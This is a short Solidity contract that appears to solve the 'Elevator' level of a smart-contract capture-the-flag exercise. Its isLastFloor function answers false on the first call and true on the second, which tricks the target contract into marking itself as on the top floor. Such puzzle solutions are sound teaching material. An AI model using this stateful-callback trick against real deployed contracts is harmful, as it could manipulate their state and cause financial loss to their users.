// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../11-Elevator.sol";

contract ElevatorAttacker {
    Elevator public victim;
    bool public called;

    constructor(address _victimAddress) {
        victim = Elevator(_victimAddress);
    }

    function attack() external {
        victim.goTo(4);
    }

    /// @notice It should return false in the first call and true in the second one.
    function isLastFloor(uint256) external returns (bool) {
        if (called) {
            return true;
        } else {
            called = true;
            return false;
        }
    }
}
